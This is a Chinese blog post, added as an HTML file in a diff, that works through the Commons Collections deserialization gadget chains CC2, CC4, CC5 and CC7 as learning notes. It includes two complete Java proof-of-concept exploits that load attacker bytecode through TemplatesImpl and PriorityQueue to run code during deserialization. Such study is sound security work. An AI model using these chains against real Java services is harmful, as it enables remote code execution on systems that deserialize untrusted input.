@@ -1,0 +1,148 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>java反序列化Commons-Collection篇04-cc2+cc4+cc5+cc7分析 | Zephyr</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Noto+Sans+SC:wght@300;400;500;700&display=swap" rel="stylesheet">
+<link rel="icon" type="image/svg+xml" href="/images/favicon.svg">
+<link rel="stylesheet" href="/css/style.css">
+<meta name="generator" content="Hexo 8.1.2"></head>
+<body>
+
+<canvas id="particles"></canvas>
+<div class="progress-bar" id="progressBar"></div>
+
+
+<nav class="top-nav" id="topNav">
+  <div class="nav-left">
+    <a href="/" class="nav-brand">Zephyr</a>
+    <a href="https://github.com/Zephyr1ng" class="nav-github" target="_blank" rel="noopener">
+      <svg width="18" height="18" viewBox="0 0 24 24" fill="currentColor"><path d="M12 0C5.37 0 0 5.37 0 12c0 5.31 3.435 9.795 8.205 11.385.6.105.825-.255.825-.57 0-.285-.015-1.23-.015-2.235-3.015.555-3.795-.735-4.035-1.41-.135-.345-.72-1.41-1.23-1.695-.42-.225-1.02-.78-.015-.795.945-.015 1.62.87 1.845 1.23 1.08 1.815 2.805 1.305 3.495.99.105-.78.42-1.305.765-1.605-2.67-.3-5.46-1.335-5.46-5.925 0-1.305.465-2.385 1.23-3.225-.12-.3-.54-1.53.12-3.18 0 0 1.005-.315 3.3 1.23.96-.27 1.98-.405 3-.405s2.04.135 3 .405c2.295-1.56 3.3-1.23 3.3-1.23.66 1.65.24 2.88.12 3.18.765.84 1.23 1.905 1.23 3.225 0 4.605-2.805 5.625-5.475 5.925.435.375.81 1.095.81 2.22 0 1.605-.015 2.895-.015 3.3 0 .315.225.69.825.57A12.02 12.02 0 0024 12c0-6.63-5.37-12-12-12z"/></svg>
+      GitHub
+    </a>
+  </div>
+  <ul class="nav-links">
+    
+      <li><a href="/">文章</a></li>
+    
+      <li><a href="/categories">分类</a></li>
+    
+      <li><a href="/archives">归档</a></li>
+    
+      <li><a href="/friends">友链</a></li>
+    
+      <li><a href="/about">关于</a></li>
+    
+  </ul>
+</nav>
+
+<div class="container">
+  <!-- Single post page -->
+<article class="post-full">
+  <header class="post-header">
+    <a href="/" class="back-link">← Home</a>
+    <h1 class="post-title">java反序列化Commons-Collection篇04-cc2+cc4+cc5+cc7分析</h1>
+    <div class="post-meta">
+      <time datetime="2025-03-02">2025-03-02</time>
+      
+    </div>
+  </header>
+
+  <div class="post-content">
+    <blockquote>
+<p>本文迁移自博客园，原文链接：<a target="_blank" rel="noopener" href="https://www.cnblogs.com/Zephyr07/articles/18747035">https://www.cnblogs.com/Zephyr07/articles/18747035</a></p>
+</blockquote>
+<h2 id="前情提要："><a href="#前情提要：" class="headerlink" title="前情提要："></a>前情提要：</h2><p>文章学习来自b站白日梦组长视频讲解，如有错误，请各位大佬提出orz！！！</p>
+<h2 id="cc4"><a href="#cc4" class="headerlink" title="cc4"></a>cc4</h2><h2 id="环境配置："><a href="#环境配置：" class="headerlink" title="环境配置："></a>环境配置：</h2><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250303112444379-1989467044.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225326304-2012067348.png"></p>
+<p>cc4在更新之后一个大版本里面存在的漏洞，如下图<br>commons-collections3的版本和4的版本在这条链上的区别就是TransformingComparator在4的版本里面继承了serialize接口</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225332801-910912100.png"></p>
+<p>首先是在TransformingComparator里面的compare的transformer方法，找到了transformer，就可以和之前的链子连在一起</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225338510-1198237371.png"></p>
+<p>然后肯定最好就是要找哪个readobject里面可以调用compare<br>这里的话cc4的作者是找到了priorityQueue类<br>priorityQueue.readobject-&gt;heapify-&gt;siftdown-&gt;siftDownUsingComparator-&gt;compare</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225345787-1388192124.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225349626-547215781.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225353652-1576092508.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225357570-1762633565.png"></p>
+<p>所以到这里其实就很简单了，就是修改了一下入口类，可以和任何一条链拼接起来<br>这里拼接的是官方的cc3链</p>
+<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><p>如果想要进到readobject.heapify的siftdown方法里面，必须要求size&gt;&gt;&gt;1必须要大于1</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225404677-2146092502.png"></p>
+<p>而这个size是在readobject里面赋值的</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225409343-1920546988.png"></p>
+<p>意思就是这个队列里面必须要有两个以上内容，才能保障2&gt;&gt;&gt;1是等于1，进而可以走到siftdown方法里面</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225415376-825646419.png"></p>
+<p>直接两个add，直接就可以进去<br>但是这里有问题的是第二个add的时候其实在序列化的时候就会执行代码<br>因为add.offer.siftUp.siftUpUsingComparator.compare<br>这样也会执行compare，就会直接把整条链子走完</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225420229-1923470341.png"></p>
+<p>所以我们需要在序列化的时候把链子断掉，这里是把transformingComparator里面传的参数修改，然后在add之后在反射修改回来</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225450213-2056984526.png"></p>
+<p>最终exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import org.apache.commons.collections4.Transformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ChainedTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InstantiateTransformer;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc4 &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodesField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        byte[] code= Files.readAllBytes(Paths.get(&quot;D://Security/JavaStudy/java_src/serialize/tmp/Test.class&quot;));</span><br><span class="line">        byte[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]&#123;Templates.class&#125;, new Object[]&#123;templates&#125;);</span><br><span class="line"></span><br><span class="line">        Transformer[] transformers=new Transformer[]&#123;</span><br><span class="line">                new ConstantTransformer(TrAXFilter.class),</span><br><span class="line">                instantiateTransformer</span><br><span class="line"></span><br><span class="line">        &#125;;</span><br><span class="line">        ChainedTransformer chainedTransformer=new ChainedTransformer&lt;&gt;(transformers);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(1);</span><br><span class="line">        priorityQueue.add(2);</span><br><span class="line"></span><br><span class="line">        Class c =transformingComparator.getClass();</span><br><span class="line">        Field transformerField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformerField.setAccessible(true);</span><br><span class="line">        transformerField.set(transformingComparator,chainedTransformer);</span><br><span class="line"></span><br><span class="line">//        serialize(priorityQueue);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj)throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="tips："><a href="#tips：" class="headerlink" title="tips："></a>tips：</h3><p>反射改size，就不用put完之后反射修改chainedtransformer<br>大家可以自己尝试修改代码试一下</p>
+<h2 id="cc2"><a href="#cc2" class="headerlink" title="cc2"></a>cc2</h2><h3 id="环境配置：-1"><a href="#环境配置：-1" class="headerlink" title="环境配置："></a>环境配置：</h3><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250303112509368-106673659.png"></p>
+<p>cc2和cc4几乎一摸一样</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225505548-333912008.png"></p>
+<p>唯一的区别就是cc2没再使用transformer数组以及InstantiateTransformer，也就是没再使用chainedtransformer<br>TransformingComparator.compare.transformer-&gt;invokertransformer</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225509878-1057983281.png"></p>
+<p>对比cc4：</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225514231-1778557645.png"></p>
+<p>最终exp：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import org.apache.commons.collections4.comparators.TransformingComparator;</span><br><span class="line">import org.apache.commons.collections4.functors.ConstantTransformer;</span><br><span class="line">import org.apache.commons.collections4.functors.InvokerTransformer;</span><br><span class="line"></span><br><span class="line">import java.io.*;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.PriorityQueue;</span><br><span class="line"></span><br><span class="line">public class cc2 &#123;</span><br><span class="line">    public static void main(String[] args)throws Exception&#123;</span><br><span class="line">        TemplatesImpl templates = new TemplatesImpl();</span><br><span class="line">        Class tc=templates.getClass();</span><br><span class="line"></span><br><span class="line">        Field nameField = tc.getDeclaredField(&quot;_name&quot;);</span><br><span class="line">        nameField.setAccessible(true);</span><br><span class="line">        nameField.set(templates,&quot;aaa&quot;);</span><br><span class="line"></span><br><span class="line">        Field bytecodesField=tc.getDeclaredField(&quot;_bytecodes&quot;);</span><br><span class="line">        bytecodesField.setAccessible(true);</span><br><span class="line"></span><br><span class="line">        byte[] code= Files.readAllBytes(Paths.get(&quot;D://Security/JavaStudy/java_src/serialize/tmp/Test.class&quot;));</span><br><span class="line">        byte[][] codes=&#123;code&#125;;</span><br><span class="line">        bytecodesField.set(templates,codes);</span><br><span class="line"></span><br><span class="line">        //就这一句和cc4不一样，其它的一摸一样，只是不调用数组了，当碰到过滤transformer数组的时候可以用这个</span><br><span class="line">        InvokerTransformer&lt;Object, Object&gt; invokerTransformer = new InvokerTransformer&lt;&gt;(&quot;newTransformer&quot;, new Class[]&#123;&#125;, new Object[]&#123;&#125;);</span><br><span class="line"></span><br><span class="line">        TransformingComparator transformingComparator = new TransformingComparator&lt;&gt;(new ConstantTransformer&lt;&gt;(1));</span><br><span class="line"></span><br><span class="line">        PriorityQueue priorityQueue = new PriorityQueue&lt;&gt;(transformingComparator);</span><br><span class="line"></span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line">        priorityQueue.add(templates);</span><br><span class="line"></span><br><span class="line">        Class c =transformingComparator.getClass();</span><br><span class="line">        Field transformerField=c.getDeclaredField(&quot;transformer&quot;);</span><br><span class="line">        transformerField.setAccessible(true);</span><br><span class="line">        transformerField.set(transformingComparator,invokerTransformer);</span><br><span class="line"></span><br><span class="line">//        serialize(priorityQueue);</span><br><span class="line">        unserialize(&quot;ser.bin&quot;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    public static void serialize(Object obj)throws IOException &#123;</span><br><span class="line">        ObjectOutputStream oos=new ObjectOutputStream(new FileOutputStream(&quot;ser.bin&quot;));</span><br><span class="line">        oos.writeObject(obj);</span><br><span class="line">    &#125;</span><br><span class="line">    public static Object unserialize(String Filename)throws IOException,ClassNotFoundException&#123;</span><br><span class="line">        ObjectInputStream ois=new ObjectInputStream(new FileInputStream(Filename));</span><br><span class="line">        Object obj=ois.readObject();</span><br><span class="line">        return obj;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="cc5"><a href="#cc5" class="headerlink" title="cc5"></a>cc5</h2><h3 id="环境配置：-2"><a href="#环境配置：-2" class="headerlink" title="环境配置："></a>环境配置：</h3><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250303112543275-1664785897.png"></p>
+<h3 id="流程分析："><a href="#流程分析：" class="headerlink" title="流程分析："></a>流程分析：</h3><p>看官方链</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225535528-2142852611.png"></p>
+<p>发现和cc1差不多，就是入口类变了<br>cc1的官方链子是AnnotationInvocationHandler.readobject，而cc5变成了BadAttributeValueException.readobject</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225535935-1156270152.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225539377-87537100.png"></p>
+<p>其实和cc6的TiedMapEntry的原理是一样的</p>
+<h2 id="cc7"><a href="#cc7" class="headerlink" title="cc7"></a>cc7</h2><h3 id="环境配置：-3"><a href="#环境配置：-3" class="headerlink" title="环境配置："></a>环境配置：</h3><p>pom.xml<br><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250303112556830-303025857.png"></p>
+<h3 id="流程分析"><a href="#流程分析" class="headerlink" title="流程分析"></a>流程分析</h3><p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225544053-3723799.png"></p>
+<p>还是入口点不一样，用到的入口点是Hashtable.readobject.reconstitutionPut.equals-&gt;AbstractMapDecorator.equals(AbstractMap.equals)</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225551802-1597066130.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225555766-1891810208.png"></p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225617602-107289942.png"></p>
+<p>虽然跟进去调用的是AbstractMapDecorator的equals，但实际上使用的是AbstractMap的equals</p>
+<p><img src="https://img2024.cnblogs.com/blog/3551469/202503/3551469-20250302225617616-718547253.png"></p>
+<p>然后就和lazymap.get后边的链子连在一起了</p>
+
+  </div>
+
+  <!-- Donation Section -->
+  <div class="donation">
+    <div class="donation-divider">
+      <span>如果文章对你有帮助</span>
+    </div>
+    <p class="donation-hint">可以请我喝杯咖啡 ☕</p>
+    <div class="donation-qrs">
+      <div class="qr-card">
+        <img src="/images/alipay.jpg" alt="支付宝收款码" onerror="this.parentElement.style.display='none'">
+        <span>支付宝</span>
+      </div>
+      <div class="qr-card">
+        <img src="/images/wechat.jpg" alt="微信收款码" onerror="this.parentElement.style.display='none'">
+        <span>微信</span>
+      </div>
+    </div>
+  </div>
+
+  
+  <nav class="post-nav">
+    
+      <a href="/2025/03/03/%E5%B7%A5%E5%8E%82%E6%A8%A1%E5%BC%8F%E5%92%8C%E5%8D%95%E4%BE%8B%E6%A8%A1%E5%BC%8F%E7%9A%84%E5%AD%A6%E4%B9%A0/" class="prev">← 工厂模式和单例模式的学习</a>
+    
+    
+      <a href="/2025/03/02/3-%E6%B3%A8%E5%85%A5%E4%B9%8B%E5%90%8E%E7%9A%84RCE%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" class="next">3.注入之后的RCE代码审计 →</a>
+    
+  </nav>
+  
+</article>
+
+</div>
+
+<script src="/js/main.js"></script>
+</body>
+</html>
